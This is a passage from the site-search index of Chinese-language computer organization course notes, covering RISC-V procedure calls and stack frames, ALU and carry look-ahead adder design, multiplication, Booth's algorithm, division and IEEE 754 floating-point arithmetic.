a1    # s1 = b\n\n    add a0, x0, s0    # \u51c6\u5907\u8c03\u7528 bar\uff0c\u4f20\u5165\u53c2\u6570 a\n    add a1, x0, s1    # \u540c\u4e0a\uff0c\u4f20\u5165\u53c2\u6570 b\n    jal x1, bar       # \u8c03\u7528 bar\n    add s0, x0, a0    # \u8fd4\u56de\u503c c \u5b58\u5728 a0 \u4e2d\uff0c\u5148\u6682\u5b58\u5728 s0 \u4e2d\n    slli s0, s0, 1    # c = c * 2\n    add a0, x0, a0    # \u5c06 foo \u7684\u8fd4\u56de\u503c\u5b58\u5165 a0\n\n    ld ra, 16(sp)     # \u6062\u590d\u503c\n    ld s1, 8(sp)\n    ld s0, 0(sp)\n    addi sp, sp, 24   # \u6e05\u7406\u6808\n\n    jalr x0, 0(ra)    # \u56de\u5230\u4e3b\u51fd\u6570\n</code></pre> <pre><code>bar:\n    addi sp, sp, -24    # \u5f00\u8f9f\u6808\u7a7a\u95f4\uff0c\u51ed\u7ecf\u9a8c\u6765\u8bb2\u4f20\u5165\n    sd s0, 0(sp)        # n\u4e2a\u53c2\u6570\uff0c\u5c31\u5f00n+1\u4e2a\u4f4d\u7f6e \n    sd s1, 8(sp)        # (n+1)*8\n    sd ra, 16(sp)       #\n    add s0, x0, a0      # \u53c2\u6570\u8f6c\u79fb\u5230\u5f53\u524d\u5360\u7528\u7684\u5bc4\u5b58\u5668\u4e2d\n    add s1, x0, a1      # \u540c\u4e0a\uff0cs1 = b\n\n    add s0, s0, s1      # a = a + b\n    add a0, x0, s0      # \u8fd4\u56de\u503c\u5b58\u5165 a0\n\n    ld ra, 16(sp)       # \u6062\u590d\u6808\n    ld s1, 8(sp)        #\n    ld s0, 0(sp)        # \n    addi sp, sp, 24     # \n\n    jalr x0, 0(ra)      # \u56de\u5230 foo \u51fd\u6570\n</code></pre> <p>\u66f4\u4e25\u683c\u7684\u6765\u8bb2\uff0c\u5bf9\u4e8e\u8fc7\u7a0b\u5f00\u5934\u5f00\u8f9f\u6808\u7a7a\u95f4\u90e8\u5206:</p> <ul> <li>\u9700\u8981\u4fdd\u7559\u7684\u5bc4\u5b58\u5668<ul> <li>Saved Registers: <code>x8-x9</code>,<code>x18-x27</code> (s0,s1...)</li> <li>Return Address: <code>x1</code> (ra)</li> <li>Stack Point: <code>x2</code> (sp)</li> <li>Frame Point: <code>x8</code> (tp)</li> <li>Stack Above: <code>sp</code> \u4e4b\u4e0a\u7684\u6570\u636e</li> </ul> </li> <li>\u4e0d\u9700\u8981\u4fdd\u7559\u7684\u5bc4\u5b58\u5668<ul> <li>Argument Registers: <code>x10-x17</code> (a0,a1,...)</li> <li>Temporary Registers: <code>x5-x7</code>,<code>x28-x31</code> (t0,t1,...)</li> <li>Stack Below: <code>sp</code> \u4e4b\u4e0b\u7684\u6570\u636e</li> </ul> </li> </ul> <p>(23-24 Final) \u4f7f\u7528\u4e86\u6ca1\u6559\u8fc7\u7684 rem \u548c div \u6307\u4ee4???</p> <pre><code>/*\nint sum(int num) {\n    if(num &lt; 10) return num;\n    return num % 10 + sum(num / 10);\n}\n*/\n\nsum:\n    addi sp, sp, -16\n    sd ra, 0(sp)\n    sd s0, 8(sp)\n\n    add s0, a0, x0    # s0 = a0\n    addi t0, x0, 10   # t0 = 10\n    blt s0, t0, done0 # if(s0 &lt; 10) goto done0\n\n    div a0, s0, t0    # a0 = num / 10\n    rem s0, s0, t0    # s0 = num % 10\n    jal ra, sum       # sum(num / 10)\n\n    add a0, a0, s0    # a0 = num % 10 + sum(num / 10)\n    beq x0, x0, done  # goto done\n\ndone0:\n    add a0, s0, x0    # a0 = num\ndone:\n    ld ra, 0(sp)\n    ld s0, 8(sp)\n    addi sp, sp, 16\n    jalr x0, 0(ra)\n</code></pre>"},{"location":"Courses/CO/Chapter2/#_7","title":"\u6709\u7528\u8d44\u6e90","text":"<ul> <li>RISC-V \u6307\u4ee4\u8bd1\u7801/\u89e3\u7801</li> <li>Venus</li> <li>Rimulator</li> </ul>"},{"location":"Courses/CO/Chapter3/","title":"CH 3. \u7b97\u672f\u5355\u5143","text":""},{"location":"Courses/CO/Chapter3/#chapter-3-arithmetic-for-computer","title":"Chapter 3. Arithmetic for Computer","text":"<p> \u7ea6 2196 \u4e2a\u5b57  64 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Courses/CO/Chapter3/#basic-alu","title":"Basic ALU","text":"<p>\u57fa\u672c\u4e0e\u6570\u903b\u4e2d ALU \u5dee\u4e0d\u591a\uff0c\u8bf7\u770b\u5b66\u957f\u7684\u7b14\u8bb0\uff01\uff08\u6216\u8005\u770b\u6211\u7684\u6570\u903b\u7b14\u8bb0QAQ\uff09</p> <p>3 Arithmetic - \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4</p> <p>\u76f8\u8f83\u4e8e\u6570\u5b57\u903b\u8f91\u8bfe\u7a0b\u4e2d\u7684 ALU \uff0c\u672c\u8bfe\u7a0b\u6240\u4ecb\u7ecd\u7684 ALU \u6309\u7167 Operation \u8981\u5b9e\u73b0\u7684\u529f\u80fd\u5982\u4e0b\uff1a</p> ALU Control Lines Function 000 And 001 Or 010 Add 110 Sub 111 Set on less than 100 nor 101 srl 011 xor"},{"location":"Courses/CO/Chapter3/#1-bit-alu","title":"1 bit \u4e0e,\u6216,\u52a0\u51cf\u6cd5 ALU","text":"<p>\u4e0a\u56fe\u5c55\u793a\u4e86\u4e00\u4e2a\u5b9e\u73b0\u4e86\u4e0e\uff0c\u6216\u4ee5\u53ca\u52a0\u51cf\u6cd5\u529f\u80fd\u7684 1bit ALU\uff0c\u4f7f\u80fd\u4fe1\u53f7 <code>operation</code> \u7528\u6765\u63a7\u5236\u591a\u8def\u9009\u62e9\u5668\u8f93\u51fa\u54ea\u4e2a\u7ed3\u679c\u3002\u5f53\u9700\u8981\u8fdb\u884c\u51cf\u6cd5\u65f6\uff0c\u5c06 <code>Binvert</code> \u4ee5\u53ca <code>CarryIn</code> \u5747\u7f6e 1 \uff0c\u5b9e\u73b0\u8865\u7801\u7684\u8fd0\u7b97\u3002</p>"},{"location":"Courses/CO/Chapter3/#64-bit-alu","title":"64 bit ALU","text":"<p>\u5c06\u4e0a\u8ff0 1bit ALU \u901a\u8fc7 <code>CarryIn</code> \u548c <code>CarryOut</code> \u7684\u524d\u540e\u8fde\u63a5\uff0c\u5373\u53ef\u7ec4\u88c5\u6210\u4e00\u4e2a 64 bit ALU</p> <p></p> <p>OF = \\(C_{n} \\oplus C_{n-1}\\), \\(CF= C_{in} \\oplus C_{out}\\) </p> <p>\u7531\u4e8e\u786c\u4ef6\u9700\u8981\u5224\u65ad\u6700\u7ec8\u7684\u7ed3\u679c\u662f\u5426\u4e3a 0\uff0c\u6700\u7b80\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u5c06\u6240\u6709 1bit Result \u8fde\u63a5\u5230\u6216\u975e\u95e8\u4e0a\uff0c\u4f5c\u4e3a\u6807\u5fd7 Zero \u8f93\u51fa\u3002\u6700\u7ec8\u5f97\u5230 ALU \u53ca\u5176\u7b26\u53f7\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Courses/CO/Chapter3/#_1","title":"\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u7531\u4e8e\u4e0a\u8ff0\u52a0\u6cd5\u5668\u540e\u4e00\u4e2a ALU \u7684 CarryIn \u4f9d\u8d56\u4e8e\u4e0a\u4e00\u4e2a ALU \u7684 CarryOut \uff0c\u5f53\u5b83\u7684\u89c4\u6a21\u589e\u5927\uff0c\u65f6\u95f4\u5ef6\u8fdf\u5c31\u4f1a\u53d8\u5f97\u5f88\u660e\u663e\u3002\u4e3a\u4e86\u51cf\u5c11\u8fd9\u4e2a\u5f71\u54cd\uff0c\u6211\u4eec\u5c06\u7b80\u5355\u4ecb\u7ecd Carry look-ahead adder(CLA) \uff0c\u5373\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668</p> <p></p> <p>\u53d6\u5355\u4e2a\u5168\u52a0\u5668\u6765\u770b\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u4f7f CarryOut \u7b49\u4e8e 1\uff0c\u90a3\u4e48 A,B,CarryIn \u4e09\u8005\u8d77\u7801\u6709\u4e24\u4e2a\u7b49\u4e8e 1\u3002</p> <p>\u6211\u4eec\u5b9a\u4e49 \\(A_i B_i\\) \u4e3a generate,\\(G_i\\) \uff1b\u5b9a\u4e49 \\(A_i\\oplus B_i\\) \u4e3a propagate,\\(P_i\\) \uff0c\u90a3\u4e48\u53ef\u4ee5\u5f97\u5230\u5173\u952e\u9012\u63a8\u5f0f\uff1a</p> \\[ C_{i+1} = G_i +P_i C_i \\] <p>\u6709\u4e86\u9012\u63a8\u5173\u7cfb\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c42\u5c42\u5e26\u5165\uff0c\u5c06 \\(C_i\\) \u66ff\u6362\u6210\u521d\u59cb\u5df2\u7ed9\u51fa\u7684\u8f93\u5165\uff1a</p> \\[\\begin{array}l C_1 = G_0 +P_0 C_0 \\\\ C_2 = G_1 +P_1 C_1 =G_1 +P_1 G_0 +P_1 P_0 C_0 \\\\ C_3 = G_2 +P_2 C_2  =G_2 +P_2 (G_1 +P_1 G_0 +P_1 P_0 C_0 ) \\\\ \\ \\ \\ \\ \\ = G_2 +P_2 G_1 +P_2 P_1 G_0 +P_2 P_1 P_0 C_0 \\\\ C_4 = G_3 +P_3 C_3 = G_3 +P_3 G_2 +P_3 P_2 G_1 \\\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ + P_3 P_2 P_1 G_0 +P_3 P_2 P_1 P_0 C_0 \\end{array}\\] <p>\u6309\u7167\u4e0a\u8ff0\u903b\u8f91\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u5efa\u51fa 4bit CLA \u8fde\u63a5\u5982\u4e0b\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u968f\u7740\u4f4d\u6570\u7684\u589e\u52a0\uff0c\u8ba1\u7b97\u4e00\u4f4d Carry \u6240\u9700\u7684\u4e0e\u95e8\u8d8a\u6765\u8d8a\u591a\uff0c\u5f00\u9500\u8d8a\u6765\u8d8a\u5927\uff1b\u540c\u65f6\u4e0e\u95e8\u7684\u8f93\u5165\u4e2a\u6570\u4e5f\u6709\u4e0a\u9650\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u901a\u5e38\u4ee5 4bit \u4e3a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4e4b\u95f4\u884c\u6ce2\u8fde\u63a5\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff1a</p> <p></p>"},{"location":"Courses/CO/Chapter3/#multiplication","title":"Multiplication","text":"<p>\u4e58\u6cd5\u672c\u8d28\u4e0a\u5c31\u662f\u52a0\u6cd5</p>"},{"location":"Courses/CO/Chapter3/#v1","title":"V1","text":"<p>\u5176\u4e2d\uff0c1000 \u79f0\u4e3a Multiplicand \u88ab\u4e58\u6570\uff1b 1001 \u79f0\u4e3a Multiplier \u4e58\u6570</p> <p>\u6838\u5fc3\u601d\u60f3\u5373\u4e3a\u5f53\u524d Multiplier \u4f4d\u6570\u4e3a 1\uff0c\u5219\u52a0\u4e0a Multiplicand \uff1b\u82e5\u4e3a 0\uff0c\u5219\u52a0\u4e0a 0</p> <p></p> <p>\u4e24\u4e2a 64bit \u7684\u6570\u76f8\u4e58\uff0c\u7ed3\u679c\u6700\u591a\u4e3a 128bit\uff1b\u5e76\u4e14 Multiplicand \u5728\u8fd0\u7b97\u8fc7\u7a0b\u4e2d\u9700\u8981\u4e0d\u65ad\u5de6\u79fb\uff0c\u6240\u4ee5\u8be5\u4e58\u6cd5\u5668\u603b\u5171\u9700\u8981\u4e00\u4e2a 64bit \u7684\u5668\u4ef6\u4ee5\u53ca\u4e09\u4e2a 128bit \u7684\u5668\u4ef6</p>"},{"location":"Courses/CO/Chapter3/#v2","title":"V2","text":"<p>\u4e3a\u4e86\u51cf\u5c11\u5f00\u9500\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4e0d\u5de6\u79fb Multiplicand \u800c\u662f\u53f3\u79fb Product\uff0c\u8fd9\u6837 Multicand \u6240\u5728\u7684\u5bc4\u5b58\u5668\u5373\u53ef\u51cf\u5c11\u81f3 64bit</p> <p>Example</p> <p></p> <p></p> <p>\u6539\u5584\u5f97\u5230\u7684\u4e58\u6cd5\u5668\u5982\u56fe\u6240\u793a\u3002\u4f46\u662f\u56fe\u4e2d Product \u5b9e\u9645\u4e0a\u4e3a 129bit\uff0c\u56e0\u4e3a\u4e58\u6cd5\u5206\u89e3\u7684\u52a0\u6cd5\u8ba1\u7b97\u96c6\u4e2d\u5728 Product \u7684\u5de6\u534a\u90e8\u5206\u6267\u884c\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6700\u9ad8\u4f4d\u6682\u65f6\u53d1\u751f\u8fdb\u4f4d\u3002</p>"},{"location":"Courses/CO/Chapter3/#v3","title":"V3","text":"<p>\u7531\u4e8e Product \u521d\u59cb\u7684\u53f3\u534a\u90e8\u5206\u5e76\u6ca1\u6709\u4f7f\u7528\uff0c\u4e14 Multiplier \u7684\u4f4d\u6570\u4f7f\u7528\u8fc7\u540e\u5373\u53ef\u4e22\u5f03\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728 Product \u7684\u53f3\u534a\u90e8\u5206\u5b58\u50a8 Multiplier \u6765\u4e3a\u4e58\u6cd5\u5668\u8282\u7701\u4e00\u4e2a 64bit \u7684\u5bc4\u5b58\u5668</p> <p>Example</p> <p></p> <p>\u4f9d\u7167\u8be5\u601d\u60f3\uff0c\u5f97\u5230\u7684\u6700\u7ec8\u7248\u672c\u4e58\u6cd5\u5668\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u8fd9\u91cc\u7684 Product \u4e5f\u662f 129bit</p>"},{"location":"Courses/CO/Chapter3/#booth","title":"Booth \u7b97\u6cd5","text":"<p>\u5728\u786c\u4ef6\u5b9e\u73b0\u65b9\u9762\uff0c\u5f80\u5f80\u79fb\u4f4d\u8fd0\u7b97\u6bd4\u52a0\u51cf\u6cd5\u8fd0\u7b97\u6709\u7740\u66f4\u5c0f\u7684\u5f00\u9500\uff0c\u6240\u4ee5\u53ef\u901a\u8fc7\u51cf\u5c11 Multiplier \u7684 1 \u7684\u6570\u91cf\u6765\u5b9e\u73b0\u66f4\u5feb\u7684\u901f\u5ea6</p> <p>Example</p> <p></p> <p>Booth \u7b97\u6cd5\u57fa\u4e8e\u6b64\u7ed9\u51fa\u4e86\u4e00\u5b9a\u89c4\u5219\uff1a</p> Bits Action 10 \u5de6\u90e8\u5206\u51cf\u53bb\u88ab\u4e58\u6570 11 \u4e0d\u505a\u7b97\u672f\u8fd0\u7b97\uff0c\u4ec5\u79fb\u4f4d 01 \u5de6\u90e8\u5206\u52a0\u4e0a\u88ab\u4e58\u6570 00 \u4e0d\u505a\u7b97\u672f\u8fd0\u7b97\uff0c\u4ec5\u79fb\u4f4d <p>\u8fd9\u91cc\u7528\u5230\u7684\u79fb\u4f4d\u4e3a\u7b97\u6570\u79fb\u4f4d\uff0c\u90471\u88651</p> <p>\u5728\u4e0a\u8ff0 V3 \u7248\u672c\u7684\u4e58\u6cd5\u5668\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fd8\u8981\u4fdd\u7559\u4e0a\u4e00\u4e2a\u6700\u4f4e\u4f4d\u7528\u6765 Booth \u7b97\u6cd5\u7684\u5224\u65ad\u3002\u5e76\u4e14\u8be5\u4e58\u6cd5\u5668\u5bf9\u4e8e\u8d1f\u6570\u4e58\u6cd5\u540c\u6837\u9002\u7528\uff0c\u63a5\u4e0b\u6765\u4ee5 2*(-3) \u4e3a\u4f8b\u5b50\u6f14\u793a\u5176\u64cd\u4f5c\uff1a</p> <p></p> <p>More Example</p> <p></p>"},{"location":"Courses/CO/Chapter3/#division","title":"Division","text":"<p>\u4e0e\u4e58\u6cd5\u7c7b\u4f3c\uff0c\u9664\u6cd5\u91c7\u7528\u79fb\u4f4d+\u51cf\u6cd5\u7684\u5f62\u5f0f\u8fd0\u7b97\u3002</p> <p></p> <p>\u5bf9\u4e8e 64bit \u7684\u9664\u6cd5\u8fd0\u7b97\uff0c\u9664\u6cd5\u5668\u7531 128bit \u7684\u4f59\u6570\u5bc4\u5b58\u5668\u300164bit \u7684\u9664\u6570\u5bc4\u5b58\u5668\u4ee5\u53ca 64bit ALU \u7ec4\u6210</p> <p></p> <p>\u521d\u59cb\u72b6\u6001\u9664\u6570\u5bc4\u5b58\u5668 Divsor \u5b58\u50a8\u9664\u6570\uff0cRemainder \u53f3\u534a\u90e8\u5206\u5b58\u50a8\u88ab\u9664\u6570\u3002\u52a0\u51cf\u8ba1\u7b97\u5747\u5728 Remainder \u7684\u5de6\u534a\u90e8\u5206\u8fdb\u884c\uff0c\u6309\u7167\u5982\u4e0b\u903b\u8f91\u8fd0\u7b97\uff1a</p> <pre><code>Div = Divsor;\nRem[0:4] = Dividend;\nsll Rem;\nloop(4): // \u8fd9\u91cc\u4ee5 4bit \u9664\u6cd5\u4e3a\u4f8b\u5b50\uff0c\u5728 64bit \u5219\u8981\u5faa\u73af\u8ba1\u7b97 64 \u6b21\n    Rem = Rem - Div;\n    if(Rem &lt; 0)\n    {\n        Rem += Div;\n        sll Rem;\n        Rem[0] = 0; //\u4ece\u53f3\u5f80\u5de6\u7684 0\n    } else {\n        sll Rem;\n        Rem[0] = 1;\n    }\nsrl Rem[4:8];\n</code></pre> <p></p> <p>\u6700\u540e Remainder \u5bc4\u5b58\u5668\u4e2d\uff0c\u5de6\u534a\u90e8\u5206\u4e3a\u4f59\u6570\uff0c\u53f3\u534a\u90e8\u5206\u4e3a\u5546\u3002</p> <p>SLL: Shift Left Logical</p>"},{"location":"Courses/CO/Chapter3/#floating-point-numbers","title":"Floating Point Numbers","text":"<p>IEEE 754 \u89c4\u5b9a\u4e86\u6d6e\u70b9\u6570\u7684\u4e24\u79cd\u6807\u51c6\u683c\u5f0f\uff0c\u5206\u522b\u4e3a\u5355\u7cbe\u5ea6\u548c\u53cc\u7cbe\u5ea6\uff1a</p> <p></p> <p>\u4e3a\u4e86\u80fd\u591f\u8868\u793a\u5c0f\u6570\uff0c\u6307\u6570\u90e8\u5206\u9700\u8981\u51cf\u53bb <code>bias</code> \uff0c\u5373\u6700\u5927\u8303\u56f4\u7684\u4e00\u534a\uff0c\u56e0\u6b64\u5bf9\u4e8e\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c<code>bias</code> \u4e3a 127 \uff1b\u5bf9\u4e8e\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c <code>bias</code> \u4e3a 1023</p> <p>\u90a3\u4e48\u6d6e\u70b9\u6570\u7684\u503c\u4e3a\uff1a</p> \\[ (-1)^\\text{sign} \\cdot (1+\\text{fraction})\\cdot 2^{\\text{exponent}-\\text{bias}} \\] <p>\u4f8b\u5982\uff0c\\(-0.75= -(\\frac{1}{2} + \\frac{1}{4})= -1.1\\cdot 2^{-1}\\)</p> <p>\u90a3\u4e48 \\(-0.75\\) \u7684\u5355\u7cbe\u5ea6\u3001\u53cc\u7cbe\u5ea6\u8868\u793a\u5206\u522b\u4e3a\uff1a</p> <p></p> <p>fraction\u662f\u76f4\u63a5\u62fc\u63a5\u5728\u5c0f\u6570\u70b9\u540e\u9762\u7684</p> Single-Precision RangeDouble-Precision Range <p></p> <p></p> <ul> <li>\u5f53 exponent \u5168\u4e3a 1 \u65f6<ul> <li>\u82e5 Fraction \u4e3a 0\uff0c\u5219\u8868\u793a\u6b63\u8d1f\u65e0\u9650</li> <li>\u82e5 Fraction \u4e0d\u4e3a 0 \uff0c\u5219\u8868\u793a Not a Number (NaN)</li> </ul> </li> <li>\u5f53 exponent \u5168\u4e3a 0 \u65f6<ul> <li>\u8868\u793a\u6781\u5c0f\u6570\uff0c\u4e14\u8ba1\u7b97\u7684\u65f6\u5019 Fraction \u4e0d\u7528\u52a0 1 </li> </ul> </li> </ul>"},{"location":"Courses/CO/Chapter3/#_2","title":"\u6d6e\u70b9\u6570\u52a0\u6cd5","text":"<p>\u6bd4\u8f83\u9636\u7801\u5927\u5c0f\u5e76\u5bf9\u9636</p> <p>\u4f7f\u4e24\u4e2a\u6570\u9636\u7801\u76f8\u540c\uff08\u5373\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5bf9\u9f50\uff09\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4f5c\u5bf9\u9636\u3002</p> <p>\u5148\u8ba1\u7b97\u4e24\u6570\u9636\u7801\u4e4b\u5dee\uff0c\u5c06\u9636\u7801\u5c0f\u7684\u6570\u5411\u9636\u7801\u5927\u7684\u6570\u5bf9\u9f50\u3002\u5bf9\u9636\u8fc7\u7a0b\u4e2d\u9636\u7801\u6bcf\u52a0\u4e00\uff0c\u5c0f\u9636\u7684\u5c3e\u6570\u5c31\u53f3\u79fb\u4e00\u4f4d\u3002</p> <p>\u4f8b\u5982\uff0c\u5728 2<sup>10</sup> * (0.11000) + 2<sup>8</sup> * (0.00110) \u7684\u52a0\u6cd5\u4e2d\uff0c\u540e\u4e00\u4e2a\u6570\u5e94\u5bf9\u9636\u4e3a 2<sup>10</sup> * (0.00001)</p> <p>\u5c3e\u6570\u6c42\u548c</p> <p>\u5c06\u5bf9\u9636\u5b8c\u6210\u7684\u5c3e\u6570\u8fdb\u884c\u6c42\u548c\uff0c\u4e0e\u5b9a\u70b9\u52a0\u51cf\u6cd5\u8fd0\u7b97\u5b8c\u5168\u76f8\u540c\u3002</p> <p>\u7ed3\u679c\u89c4\u683c\u5316 Normalization</p> <p>\u4e3a\u4e86\u589e\u52a0\u6709\u6548\u6570\u5b57\u7684\u4f4d\u6570\uff0c\u63d0\u9ad8\u8fd0\u7b97\u7cbe\u5ea6\uff0c\u5fc5\u987b\u5c06\u6c42\u548c\u7684\u7ed3\u679c\u8fdb\u884c\u89c4\u683c\u5316\u3002</p> <p>\u4ee5 <code>float</code> \u7c7b\u578b\u4e3a\u4f8b\uff0c\u5176\u5c3e\u6570\u4f4d\u6570\u5171 23 \u4f4d\uff0c\u90a3\u4e48\u5176\u8fdb\u884c\u5c3e\u6570\u6c42\u548c\u65f6\u8fd0\u7b97\u6570\u7684\u4f4d\u6570\u4e3a 24 \u4f4d(1+fraction)\uff0c\u8003\u8651\u8fdb\u4f4d\uff0c\u90a3\u4e48\u5c3e\u6570\u6c42\u548c\u7684\u7ed3\u679c\u5171 25 \u4f4d\uff0c\u5047\u8bbe\u547d\u540d\u4e3a <code>result</code></p> <p>\u4e3a\u4e86\u8fdb\u884c\u89c4\u683c\u5316\uff0c\u6211\u4eec\u8981\u6c42\u6700\u7ec8\u5c3e\u6570\u7684\u7b2c 24 \u4f4d\u4e3a 1\uff08\u5c3d\u7ba1\u5c3e\u6570\u53ea\u6709 23 \u4f4d\uff09\uff0c\u90a3\u4e48\uff1a</p> <ul> <li>\u5982\u679c <code>result[24] = 1</code> (\u91c7\u7528 Verilog \u8bed\u6cd5\uff0c\u5373\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d) \uff0c\u8868\u793a\u5c3e\u6570\u5df2\u7ecf\u8d85\u8fc7\u8303\u56f4\uff0c\u6b64\u65f6\u5c06\u5176\u53f3\u79fb\u4e00\u4f4d\uff0c\u540c\u65f6\u9636\u7801\u52a0\u4e00\uff1a</li> <li>\u5426\u5219\uff0c\u8fdb\u5165\u4e00\u4e2a <code>while</code> \u5faa\u73af\uff1a</li> </ul> <pre><code>while(result[23] == 0 &amp;&amp; exp &gt; 0)\n{\n    result = result &lt;&lt; 1;\n    exp -= 1;\n}\n</code></pre> <p>\u6700\u7ec8\u5c3e\u6570\u53d6 <code>result[22:0]</code> \uff08\u5373\u820d\u53bb<code>result[23]</code>,<code>result[24]</code>\uff09</p> <p>\u820d\u5165\u5904\u7406</p> <p>\u5728\u5bf9\u9636\u6216\u8005\u5411\u53f3\u89c4\u683c\u5316\u65f6\uff0c\u5c3e\u6570\u5411\u53f3\u79fb\u4f4d\u5bfc\u81f4\u4f4e\u4f4d\u88ab\u4e22\u5f03\uff0c\u4ece\u800c\u9020\u6210\u4e00\u5b9a\u8bef\u5dee\uff0c\u56e0\u6b64\u8981\u8fdb\u884c\u820d\u5165\u5904\u7406\uff1a</p> <ul> <li>&lt;1&gt; \"0\u820d1\u5165\u6cd5\" <ul> <li>\u5982\u679c\u53f3\u79fb\u65f6\u4e22\u5f03\u7684\u6700\u9ad8\u4f4d\u4e3a 0 \u5219\u4e0d\u505a\u5904\u7406\uff1b\u4e3a 1 \u5219\u5c06\u5c3e\u6570\u672b\u4f4d\u52a0\u4e00</li> <li>\u7c7b\u4f3c\u5341\u8fdb\u5236\u7684\u56db\u820d\u4e94\u5165</li> </ul> </li> <li>&lt;2&gt; \"\u6052\u7f6e\u4e00\u6cd5\"<ul> <li>\u53ea\u8981\u53d1\u751f\u53f3\u79fb\uff0c\u5c31\u5c06\u5c3e\u6570\u7684\u672b\u4f4d\u66f4\u65b0\u4e3a 1</li> </ul> </li> <li>&lt;3&gt; Rounding to nearest even<ul> <li>\u53ea\u6709\u5f53 extra bits \u4e3a <code>100</code> \u65f6\uff0c\u820d\u6210\u5076\u6570(\u672b\u4f4d\u4e3a0)\uff0c\u5426\u5219\u6309\u71670\u820d1\u5165\u6cd5\u6765</li> <li>guard bit\uff1a\u6700\u4f4e\u6709\u6548\u4f4d</li> <li>round bit\uff1a\u6700\u4f4e\u6709\u6548\u4f4d\u53f3\u8fb9\u7684\u7b2c\u4e00\u4f4d</li> <li>sticky bit\uff1a\u53ea\u8981 round bit \u53f3\u8fb9\u51fa\u73b0\u8fc7\u975e\u96f6\u4f4d\uff0c\u5c31\u5c06 sticky bit \u7f6e 1</li> </ul> </li> </ul> <p></p> <p>\u4e0d\u540c\u6559\u6750\u4f3c\u4e4e\u4e0d\u4e00\u6837\uff0c\u672c\u8bfe\u7a0b Guard bit \u8981\u4ece\u6700\u4f4e\u6709\u6548\u4f4d\u7684\u4e0b\u4e00\u4f4d\u5f00\u59cb\u8ba1\u7b97</p> <p></p>"},{"location":"Courses/CO/Chapter3/#_3","title":"\u793a\u4f8b","text":"<p>Example 1:\u534a\u7cbe\u5ea6\u6d6e\u70b9\u6570\u52a0\u6cd5 with round up</p> <p></p> <p>Example 2\uff1a\u91c7\u7528\u8865\u7801\u52a0\u51cf\u6cd5\u7684\u6d6e\u70b9\u6570\u52a0\u6cd5</p> <p>\\(x=0.1101\\times 2^{01},y= (-0.1010)\\times 2^{11}\\)\uff0c\u6c42 \\(x+y\\)</p> <p>\u5199\u51fa\u5bf9\u5e94\u7684\u8865\u7801\u5f62\u5f0f\uff1a</p> \\[\\begin{array}l [x]\\text{\u8865\u7801\uff1a} 00,01; 00.1101 \\\\ [y]\\text{\u8865\u7801\uff1a} 00,11; 11.0110 \\end{array}\\] <p>\u53cc\u8865\u7801</p> <p>\u4e24\u4f4d\u8868\u793a\u7b26\u53f7\u4f4d</p> <p></p> <p></p>"},{"location":"Courses/CO/Chapter3/#_4","title":"\u6d6e\u70b9\u6570\u4e58\u6cd5","text":"<p>\u5206\u522b\u5904\u7406\u7b26\u53f7\u4f4d\u3001exponent\u548cfraction\uff1a</p> <ul> <li>\u5c06\u4e24\u4e2a Exponent \u76f8\u52a0\uff0c\u5e76\u51cf\u53bb\u4e00\u4e2a bias\uff0c\u56e0\u4e3a bias\u52a0\u4e86\u4e24\u6b21</li> <li>\u5c06\u4e24\u4e2a (1+Fraction) \u76f8\u4e58\uff0c\u5e76\u5c06\u5176\u89c4\u683c\u5316</li> <li>\u6839\u636e\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u7b26\u53f7\u51b3\u5b9a\u7ed3\u679c\u7684\u7b26\u53f7</li> </ul> <p>(23-24 Final) \u4e0b\u5217\u8fd0\u7b97\u7ed3\u679c\uff0c\u54ea\u4e2a\u4e0d\u662f NaN ?</p> <ul> <li>A. 0 * inf</li> <li>B. +inf - (-inf)<ul> <li>\u65e0\u7a77\u5927\u4e4b\u95f4\u7684\u52a0\u51cf\u4e58\u9664\u90fd\u662f NaN</li> </ul> </li> <li>C. 8/0<ul> <li>\u7ed3\u679c\u662f inf</li> </ul> </li> <li>D. Any arithmetic operation with NaN</li> </ul> <pre><code>#include &lt;stdio.h&gt;\n\ntypedef unsigned int word;\n\nunion floatIntTag {\n    float f;\n    unsigned int d;\n} u;\n\nword floatToInt(word x) {\n    // \u89e3\u6790 IEEE 754 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u683c\u5f0f\n    int sign = (x &gt;&gt; 31) &amp; 1;       // \u7b26\u53f7\u4f4d\n    int exponent = ((x &gt;&gt; 23) &amp; 0xFF) - 127; // \u6307\u6570\u90e8\u5206\uff0c\u51cf\u53bb\u504f\u7f6e\u503c 127\n    unsigned int mantissa = (x &amp; 0x7FFFFF) | 0x800000; // \u5c3e\u6570\u90e8\u5206\uff0c\u52a0\u9690\u542b\u7684 1\n\n    // \u68c0\u67e5\u7279\u6b8a\u60c5\u51b5\n    if (exponent &gt;= 31) { \n        // \u8d85\u51fa 32 